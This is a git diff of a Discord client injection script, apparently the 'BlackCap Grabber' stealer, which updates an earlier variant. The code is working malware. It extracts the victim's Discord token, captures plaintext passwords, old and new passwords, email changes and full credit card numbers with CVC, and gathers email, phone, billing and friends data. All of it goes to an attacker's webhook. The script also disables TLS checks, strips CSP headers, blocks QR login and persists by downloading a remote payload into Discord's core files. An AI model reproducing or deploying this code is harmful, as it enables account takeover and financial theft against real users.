@@ -1,19 +1,26 @@
+process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
+
 const fs = require("fs")
-const { electron, app, session } = require('electron');
-const https = require("https");
-const queryString = require("querystring")
+const { electron, BrowserWindow, app } = require('electron')
+const session = require('electron').session
+const https = require("https")
+const queryString = require("querystring");
 
 var computerName = process.env.COMPUTERNAME
-var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
-var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
+const executeJS = script => {
+    const window = BrowserWindow.getAllWindows()[0];
+    return window.webContents.executeJavaScript(script, !0);
+};
+const tokenScript = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+const logOutScript = async () => await executeJS(`function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`);
 var config = {
     "logout": "true",
     "logout-notify": "true",
-    "init-notify": "false",
+    "init-notify": "true",
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js",
-    webhook: `%HOOKRE%`,
+    webhook: "%HOOKRE%",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -39,27 +46,29 @@ var config = {
     }
 };
 
-async function execScript(str) {
-    var window = electron.BrowserWindow.getAllWindows()[0]
-    var script = await window.webContents.executeJavaScript(str, true)
-    return script || null
-
-}
-
 const makeEmbed = async ({
     title,
     fields,
     image,
-    thumbnail
+    thumbnail,
+    description
 }) => {
     var params = {
-        username: "RaR-Notif",
-        avatar_url: "https://raw.githubusercontent.com/Raplhs/444444iew543333/main/deadcored.png",
+        username: "BlackCap Grabber",
+        avatar_url: "",
         content: "",
         embeds: [{
             title: title,
             color: config["embed-color"],
             fields: fields,
+            description: description ?? "",
+            author: {
+                name: "BlackCap"
+            },
+            footer: {
+                text: "©KSCH | https://github.com/KSCHdsc"
+            },
+
         }]
     };
 
@@ -77,26 +86,13 @@ const getIP = async () => {
 }
 
 const getURL = async (url, token) => {
-    try {
-        const response = await fetch(url, {
-            method: 'GET',
-            headers: {
-                'Authorization': token
-            }
-        });
-        
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-
-        const jsonData = await response.json();
-        return jsonData;
-    } catch (error) {
-        console.error('Error:', error);
-        return null; // or handle the error in some other way
-    }
+    var c = await execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "${url}", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    JSON.parse(xmlHttp.responseText);`)
+    return c
 }
-
 
 const getGifOrPNG = async (url) => {
     var tt = [".gif?size=512", ".png?size=512"]
@@ -118,6 +114,16 @@ const GetRBadges = (e) => {
     return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 
+const GetNSFW = (bouki) => {
+    switch (bouki) {
+        case true:
+            return ":underage: `NSFW Allowed`"
+        case false:
+            return ":underage: `NSFW Not Allowed`"
+        default:
+            return "Idk bro you got me"
+    }
+}
 const GetA2F = (bouki) => {
     switch (bouki) {
         case true:
@@ -125,7 +131,22 @@ const GetA2F = (bouki) => {
         case false:
             return ":lock: `A2F Not Enabled`"
         default:
-            return "Idk"
+            return "Idk bro you got me"
+    }
+}
+
+
+const parseFriends = friends => {
+    var real = friends.filter(x => x.type == 1)
+    var rareFriends = ""
+    for (var friend of real) {
+        var badges = GetRBadges(friend.user.public_flags)
+        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
+    }
+    if (!rareFriends) rareFriends = "No Rare Friends"
+    return {
+        len: real.length,
+        badges: rareFriends
     }
 }
 
@@ -135,10 +156,10 @@ const parseBilling = billings => {
         if (res.invalid) return
         switch (res.type) {
             case 1:
-                Billings += ":white_check_mark: :credit_card:"
+                Billings += ":heavy_check_mark: :credit_card:"
                 break
             case 2:
-                Billings += ":white_check_mark: <:paypal:896441236062347374>"
+                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
         }
     })
     if (!Billings) Billings = ":x:"
@@ -200,7 +221,7 @@ function GetLangue(read) {
         "ko": ":flag_kr: Korean"
     }
 
-    var langue = languages[read] || "???";
+    var langue = languages[read] || "No Languages Detected ????";
     return langue
 }
 const post = async (params) => {
@@ -225,82 +246,105 @@ const post = async (params) => {
     })
 
 }
-const FirstTime = async () => {
-    var token = await execScript(tokenScript)
+const FirstTime = async () => { // here we are
+    var token = await tokenScript();
     if (config['init-notify'] !== "true") return false
+    if (config['init-notify'] !== "false") return true
+    
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "Status: Initalized",
+            title: "BlackCap Initalized",
             fields: [{
-                name: "Extra Info",
+                name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
         })
     } else {
-        var user = await getURL("https://discord.com/api/v*/users/@me", token)
-        var billing = await getURL("https://discord.com/api/v*/users/@me/billing/payment-sources", token)
-        var Nitro = await getURL("https://discord.com/api/v*/users/" + user.id + "/profile", token);
+        var user = await getURL("https://discord.com/api/v9/users/@me", token)
+        var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+        var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
+        var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-        var Billings = parseBilling(billing) // here we are
+        var Billings = parseBilling(billing)
+        var Friends = parseFriends(friends)
 
+        userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "Logger Initalized",
+            title: "BlackCap Initalized",
             fields: [{
                 name: "Injection Info",
-                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n`,
+                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                 inline: !1
             }, {
                 name: "Username <:username:1041634536733290596> ",
-                value: `\`${user.username}#${GetLangue(user.locale)}#${user.discriminator}\``,
+                value: `\`${user.username}#${user.discriminator}\``,
                 inline: !0
             }, {
                 name: "ID <:iduser:1041634535395307520>",
-                value: `\`${user.id}\`\`${GetLangue(user.locale)}`,
-                inline: !0
-            }, {
-                name: "<a:tokens:1041634540537511957> Token",
-                value: `\`\`\`${token}\`\`\``,
-                inline: !1
-            }, {
-                name: "Badges <:badge:1041634538150973460>",
-                value: `${GetBadges(user.flags)}`,
+                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                 inline: !0
             }, {
                 name: "Nitro <a:nitro:1041639670288748634>",
                 value: `${GetNitro(Nitro)}`,
                 inline: !0
             }, {
+                name: "Badges <:badge:1041634538150973460>",
+                value: `${GetBadges(user.flags)}`,
+                inline: !0
+            }, {
+                name: "Language <:language:1041640473477001236>",
+                value: `${GetLangue(user.locale)}`,
+                inline: !0
+            }, {
+                name: "NSFW <a:nsfw:1041640474617839616>",
+                value: `${GetNSFW(user.nsfw_allowed)}`,
+                inline: !1
+            }, {
+                name: "A2F <a:a2f:1040272766982692885>",
+                value: `${GetA2F(user.mfa_enabled)}`,
+                inline: !0
+            }, {
+                name: "@Copyright",
+                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                inline: !0
+            }, {
                 name: "Billing <a:billing:1041641103629234196>",
                 value: `${Billings}`,
                 inline: !1
-            }, {
-                name: "Phone :mobile_phone:",
-                value: `\`${user.phone ?? "None"}\``,
-                inline: !0
             }, {
                 name: "Email <a:email:1041639672037785691>",
                 value: `\`${user.email}\``,
                 inline: !0
             }, {
-                name: "A2F <a:a2f:1040272766982692885>",
-                value: `${GetA2F(user.mfa_enabled)}`,
+                name: "Phone :mobile_phone:",
+                value: `\`${user.phone ?? "None"}\``,
                 inline: !0
+            }, {
+                name: "<a:tokens:1041634540537511957> Token",
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                inline: !1
             }],
             image: userBanner,
             thumbnail: userAvatar
         })
+        var params2 = await makeEmbed({
+            title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+            color: config['embed-color'],
+            description: Friends.badges,
+            image: userBanner,
+            thumbnail: userAvatar
+        })
 
-        params.embeds.push()
+        params.embeds.push(params2.embeds[0])
     }
     await post(params)
-    if (config.logout == "true" && config['logout-notify'] === "true") {
-        await mainWindow.webContents.executeJavaScript(logOutScript);
+    if ((config.logout == "false" || config.logout == "%LOGOUT%") && config['logout-notify'] == "false") {
         if (!token) {
             var params = await makeEmbed({
-                title: "User Logged Out (User Not Logged in Before)",
+                title: "BlackCaped User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -308,78 +352,100 @@ const FirstTime = async () => {
                 }]
             })
         } else {
-            var user = await getURL("https://discord.com/api/v8/users/@me", token)
+            var user = await getURL("https://discord.com/api/v9/users/@me", token)
             var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+            var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
             var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
             var Billings = parseBilling(billing)
+            var Friends = parseFriends(friends)
 
+            userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Victim Got Logged Out",
+                title: "BlackCap Victim got logged out",
                 fields: [{
                     name: "Injection Info",
-                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n`,
+                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                     inline: !1
                 }, {
                     name: "Username <:username:1041634536733290596> ",
-                    value: `\`${user.username}#${GetLangue(user.locale)}#${user.discriminator}\``,
+                    value: `\`${user.username}#${user.discriminator}\``,
                     inline: !0
                 }, {
                     name: "ID <:iduser:1041634535395307520>",
-                    value: `\`${user.id}\``,
-                    inline: !0
-                }, {
-                    name: "<a:tokens:1041634540537511957> Token",
-                    value: `\`\`\`${token}\`\`\``,
-                    inline: !1
-                }, {
-                    name: "Badges <:badge:1041634538150973460>",
-                    value: `${GetBadges(user.flags)}`,
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                     inline: !0
                 }, {
                     name: "Nitro <a:nitro:1041639670288748634>",
                     value: `${GetNitro(Nitro)}`,
                     inline: !0
                 }, {
+                    name: "Badges <:badge:1041634538150973460>",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: !0
+                }, {
+                    name: "Language <:language:1041640473477001236>",
+                    value: `${GetLangue(user.locale)}`,
+                    inline: !0
+                }, {
+                    name: "NSFW <a:nsfw:1041640474617839616>",
+                    value: `${GetNSFW(user.nsfw_allowed)}`,
+                    inline: !1
+                }, {
+                    name: "A2F <a:a2f:1040272766982692885>",
+                    value: `${GetA2F(user.mfa_enabled)}`,
+                    inline: !0
+                }, {
+                    name: "@Copyright",
+                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                    inline: !0
+                }, {
                     name: "Billing <a:billing:1041641103629234196>",
                     value: `${Billings}`,
                     inline: !1
-                }, {
-                    name: "Phone :mobile_phone:",
-                    value: `\`${user.phone ?? "None"}\``,
-                    inline: !0
                 }, {
                     name: "Email <a:email:1041639672037785691>",
                     value: `\`${user.email}\``,
                     inline: !0
                 }, {
-                    name: "A2F <a:a2f:1040272766982692885>",
-                    value: `${GetA2F(user.mfa_enabled)}`,
+                    name: "Phone :mobile_phone:",
+                    value: `\`${user.phone ?? "None"}\``,
                     inline: !0
+                }, {
+                    name: "<a:tokens:1041634540537511957> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: !1
                 }],
                 image: userBanner,
                 thumbnail: userAvatar
             })
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
 
-            params.embeds.push()
+            params.embeds.push(params2.embeds[0])
         }
+        await logOutScript();
         await post(params)
     }
     return false
 }
 
 const path = (function () {
-    let LOCAL = process.env.LOCALAPPDATA;
-    var appName = "Discord";
-    var appPath = `${LOCAL}/${appName}`;
-    appPath = appPath.split("/").join("/"); // Split the string into an array, join with '/' delimiter
+    var appPath = app.getAppPath().replace(/\\/g, "/").split("/")
+    appPath.pop()
+    appPath = appPath.join("/")
+    var appName = app.getName()
     return {
         appPath,
         appName
-    };
-})();
-
+    }
+}())
 
 const checUpdate = () => {
     var {
@@ -396,36 +462,29 @@ const checUpdate = () => {
     if (!fs.existsSync(ressource)) fs.mkdirSync(ressource)
     fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
-    var script = `const fs = require("fs");
-    const https = require("https");
-    
-    var index = "${indexFile}";
-    var betterDiscord = "${betterDiscord}";
-    var bouki = fs.readFileSync(index).toString();
-    
-    if (bouki == "module.exports = require('./core.asar');") {
-        init();
-    }
-    
-    function init() {
-        https.get("${config.injection_url}", res => {
-            var chunk = "";
-            res.on("data", data => chunk += data);
-            res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")));
-        }).on("error", (err) => setTimeout(init(), 10000));
-    }
-    
-    require("${resource}/app.asar");
-    
-    if (fs.existsSync(betterDiscord)) {
-        require(betterDiscord);
-    }`;
+    var script = `const fs = require("fs"), https = require("https")
+var index = "${indexFile}"
+var betterDiscord = "${betterDiscord}"
+var bouki = fs.readFileSync(index).toString()
+if (bouki == "module.exports = require('./core.asar');") init()
+function init() {
+    https.get("${config.injection_url}", res => {
+        var chunk = ""
+        res.on("data", data => chunk += data)
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")))
+    }).on("error", (err) => setTimeout(init(), 10000));
+}
+require("${appPath}/app.asar")
+if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
     fs.writeFileSync(index, script)
+    if (config.logout == true) {
+       logOutScript();
+    }
     return
 }
-electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
-    await electron.app.whenReady();
+session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
+    await app.whenReady();
     await FirstTime()
     if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
         cancel: true
@@ -435,7 +494,7 @@ electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async 
     callback({})
 })
 
-electron.session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
+session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
     delete request.responseHeaders['content-security-policy']
     delete request.responseHeaders['content-security-policy-report-only']
     callback({
@@ -446,7 +505,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived((request, callback)
     })
 })
 
-electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
+session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
     if (!["POST", "PATCH"].includes(request.method)) return
     if (request.statusCode !== 200) return
     try {
@@ -454,20 +513,25 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     } catch (err) {
         var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
     }
-    var token = await mainWindow.webContents.executeJavaScript(tokenScript);
+    var token = await tokenScript();
+    console.log(token);
     var ip = await getIP()
-    var user = await getURL("https://discord.com/api/v*/users/@me", token)
-    var billing = await getURL("https://discord.com/api/v*/users/@me/billing/payment-sources", token)
-    var Nitro = await getURL("https://discord.com/api/v*/users/" + user.id + "/profile", token);
+    var user = await getURL("https://discord.com/api/v9/users/@me", token)
+    var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+    var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
+    var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
+    userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
     var Billings = parseBilling(billing)
+    var Friends = parseFriends(friends)
 
     switch (true) {
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "User Logged In",
+                title: "BlackCap User Login",
+                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -475,51 +539,71 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !1
                 }, {
                     name: "Username <:username:1041634536733290596> ",
-                    value: `\`${user.username}#${GetLangue(user.locale)}#${user.discriminator}\``,
+                    value: `\`${user.username}#${user.discriminator}\``,
                     inline: !0
                 }, {
                     name: "ID <:iduser:1041634535395307520>",
-                    value: `\`${user.id}\``,
-                    inline: !0
-                }, {
-                    name: "<a:tokens:1041634540537511957> Token",
-                    value: `\`\`\`${token}\`\`\``,
-                    inline: !1
-                }, {
-                    name: "Badges <:badge:1041634538150973460>",
-                    value: `${GetBadges(user.flags)}`,
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                     inline: !0
                 }, {
                     name: "Nitro <a:nitro:1041639670288748634>",
                     value: `${GetNitro(Nitro)}`,
                     inline: !0
                 }, {
+                    name: "Badges <:badge:1041634538150973460>",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: !0
+                }, {
+                    name: "Language <:language:1041640473477001236>",
+                    value: `${GetLangue(user.locale)}`,
+                    inline: !0
+                }, {
+                    name: "NSFW <a:nsfw:1041640474617839616>",
+                    value: `${GetNSFW(user.nsfw_allowed)}`,
+                    inline: !1
+                }, {
+                    name: "A2F <a:a2f:1040272766982692885>",
+                    value: `${GetA2F(user.mfa_enabled)}`,
+                    inline: !0
+                }, {
+                    name: "@Copyright",
+                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                    inline: !0
+                }, {
                     name: "Billing <a:billing:1041641103629234196>",
                     value: `${Billings}`,
                     inline: !1
                 }, {
-                    name: "Phone :mobile_phone:",
-                    value: `\`${user.phone ?? "None"}\``,
-                    inline: !0
-                }, {
                     name: "Email <a:email:1041639672037785691>",
                     value: `\`${user.email}\``,
+                    inline: !0
+                }, {
+                    name: "Phone :mobile_phone:",
+                    value: `\`${user.phone ?? "None"}\``,
                     inline: !0
                 }, {
                     name: "<a:password:1041639669047238676> Password",
                     value: `\`${password}\``,
                     inline: !0
                 }, {
-                    name: "A2F <a:a2f:1040272766982692885>",
-                    value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
+                    name: "<a:tokens:1041634540537511957> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: !1
                 }],
 
                 thumbnail: userAvatar,
                 image: userBanner
             })
 
-            params.embeds.push()
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
         
             await post(params)
             break
@@ -527,7 +611,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Password Change Detected",
+                    title: "BlackCap Detect Password Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -535,35 +620,47 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !1
                     }, {
                         name: "Username <:username:1041634536733290596> ",
-                        value: `\`${user.username}#${GetLangue(user.locale)}#${user.discriminator}\``,
+                        value: `\`${user.username}#${user.discriminator}\``,
                         inline: !0
                     }, {
                         name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${user.id}\``,
-                        inline: !0
-                    }, {
-                        name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: !1
-                    }, {
-                        name: "Badges <:badge:1041634538150973460>",
-                        value: `${GetBadges(user.flags)}`,
+                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                         inline: !0
                     }, {
                         name: "Nitro <a:nitro:1041639670288748634>",
                         value: `${GetNitro(Nitro)}`,
                         inline: !0
                     }, {
+                        name: "Badges <:badge:1041634538150973460>",
+                        value: `${GetBadges(user.flags)}`,
+                        inline: !0
+                    }, {
+                        name: "Language <:language:1041640473477001236>",
+                        value: `${GetLangue(user.locale)}`,
+                        inline: !0
+                    }, {
+                        name: "NSFW <a:nsfw:1041640474617839616>",
+                        value: `${GetNSFW(user.nsfw_allowed)}`,
+                        inline: !0
+                    }, {
+                        name: "A2F <a:a2f:1040272766982692885>",
+                        value: `${GetA2F(user.mfa_enabled)}`,
+                        inline: !0
+                    }, {
+                        name: "@Copyright",
+                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        inline: !0
+                    }, {
                         name: "Billing <a:billing:1041641103629234196>",
                         value: `${Billings}`,
                         inline: !0
                     }, {
-                        name: "Phone :mobile_phone:",
-                        value: `\`${user.phone ?? ":x:"}\``,
-                        inline: !0
-                    }, {
                         name: "Email <a:email:1041639672037785691>",
                         value: `\`${user.email}\``,
+                        inline: !0
+                    }, {
+                        name: "Phone :mobile_phone:",
+                        value: `\`${user.phone ?? ":x:"}\``,
                         inline: !0
                     }, {
                         name: "<a:password:1041639669047238676> Old Password",
@@ -574,23 +671,35 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.new_password}\``,
                         inline: !0
                     }, {
-                        name: "A2F <a:a2f:1040272766982692885>",
-                        value: `${GetA2F(user.mfa_enabled)}`,
-                        inline: !0
+                        name: "Bio <a:blackcapgif:1041634542093619260>",
+                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                        inline: !1
+                    }, {
+                        name: "<a:tokens:1041634540537511957> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        inline: !1
                     }, ],
 
                     thumbnail: userAvatar,
                     image: userBanner
                 })
 
-                params.embeds.push()
+                var params2 = await makeEmbed({
+                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                    color: config['embed-color'],
+                    description: Friends.badges,
+                    image: userBanner,
+                    thumbnail: userAvatar
+                })
+
+                params.embeds.push(params2.embeds[0])
             
                 await post(params)
             }
-
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Email Change Detected",
+                    title: "BlackCap Detect Email Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -598,51 +707,75 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !1
                     }, {
                         name: "Username <:username:1041634536733290596> ",
-                        value: `\`${user.username}#${GetLangue(user.locale)}#${user.discriminator}\``,
+                        value: `\`${user.username}#${user.discriminator}\``,
                         inline: !0
                     }, {
                         name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${user.id}\`\n`,
-                        inline: !0
-                    }, {
-                        name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: !1
-                    }, {
-                        name: "Badges <:badge:1041634538150973460>",
-                        value: `${GetBadges(user.flags)}`,
+                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                         inline: !0
                     }, {
                         name: "Nitro <a:nitro:1041639670288748634>",
                         value: `${GetNitro(Nitro)}`,
                         inline: !0
                     }, {
+                        name: "Badges <:badge:1041634538150973460>",
+                        value: `${GetBadges(user.flags)}`,
+                        inline: !0
+                    }, {
+                        name: "Language <:language:1041640473477001236>",
+                        value: `${GetLangue(user.locale)}`,
+                        inline: !0
+                    }, {
+                        name: "NSFW <a:nsfw:1041640474617839616>",
+                        value: `${GetNSFW(user.nsfw_allowed)}`,
+                        inline: !1
+                    }, {
+                        name: "A2F <a:a2f:1040272766982692885>",
+                        value: `${GetA2F(user.mfa_enabled)}`,
+                        inline: !0
+                    }, {
+                        name: "@Copyright",
+                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        inline: !0
+                    }, {
                         name: "Billing <a:billing:1041641103629234196>",
                         value: `${Billings}`,
                         inline: !1
                     }, {
-                        name: "Phone :mobile_phone:",
-                        value: `\`${user.phone ?? "None"}\``,
-                        inline: !0
-                    }, {
                         name: "New Email <a:email:1041639672037785691>",
                         value: `\`${user.email}\``,
+                        inline: !0
+                    }, {
+                        name: "Phone :mobile_phone:",
+                        value: `\`${user.phone ?? "None"}\``,
                         inline: !0
                     }, {
                         name: "<a:password:1041639669047238676> Password",
                         value: `\`${data.password}\``,
                         inline: !0
                     }, {
-                        name: "A2F <a:a2f:1040272766982692885>",
-                        value: `${GetA2F(user.mfa_enabled)}`,
-                        inline: !0
+                        name: "Bio <a:blackcapgif:1041634542093619260>",
+                        value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                        inline: !1
+                    }, {
+                        name: "<a:tokens:1041634540537511957> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        inline: !1
                     }, ],
 
                     thumbnail: userAvatar,
                     image: userBanner
                 })
 
-                params.embeds.push()
+                var params2 = await makeEmbed({
+                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                    color: config['embed-color'],
+                    description: Friends.badges,
+                    image: userBanner,
+                    thumbnail: userAvatar
+                })
+
+                params.embeds.push(params2.embeds[0])
             
                 await post(params)
             }
@@ -651,24 +784,34 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Credit Card Added",
+                title: "BlackCap User Credit Card Added",
                 description: `
-                **IP:** ${ip}, ${GetLangue(user.locale)}\n\n
+                **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
                 **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
-                **Badges** <:badge:1041634538150973460>\n${GetBadges(user.flags)}\n
-                **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(user.premium_type)}\n
                 **Email** <a:email:1041639672037785691>\n\`\`\`${user.email}\`\`\`\n
+                **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(user.premium_type)}\n
+                **Language** <:language:1041640473477001236>\n${GetLangue(user.locale)}\n
